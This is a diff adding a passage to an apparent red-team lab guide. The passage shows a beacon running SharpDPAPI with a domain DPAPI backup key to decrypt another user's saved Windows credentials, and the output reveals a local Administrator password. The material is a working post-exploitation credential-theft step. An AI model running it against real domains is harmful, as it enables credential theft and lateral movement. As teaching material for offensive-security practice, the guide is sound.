@@ -40,3 +40,36 @@ Folder       : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\
 
     [X] MasterKey GUID not in cache: {120b3a8a-683d-4db8-8f13-e4c466949bd2}
 ```
+
+The `/rpc` method will not work in this case, because dyork cannot recover the masterkey for pchilds.  Instead, we use the domain's master backup key to decrypt the credentials via the `/pvk` parameter.
+
+```powershell
+beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /pvk:HvG1s[...snip...]lXQns=
+
+[*] Action: User DPAPI Credential Triage
+
+[*] Using a domain DPAPI backup key to triage masterkeys for decryption key mappings!
+
+[*] User master key cache:
+
+{120b3a8a-683d-4db8-8f13-e4c466949bd2}:62DD49BC2CF3000FC9DF3E3B6B48CA732D77FB34
+
+[*] Triaging Credentials for ALL users
+
+Folder       : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\
+
+  CredFile           : 9CAEEF854B7702E986B47C751DFE9AD2
+
+    guidMasterKey    : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
+    size             : 396
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+    description      : Local Credential Data
+
+    LastWritten      : 14/02/2025 14:02:28
+    TargetName       : Domain:target=TERMSRV/lon-ws-1
+    TargetAlias      : 
+    Comment          : 
+    UserName         : LON-WS-1\Administrator
+    Credential       : Passw0rd!
+```
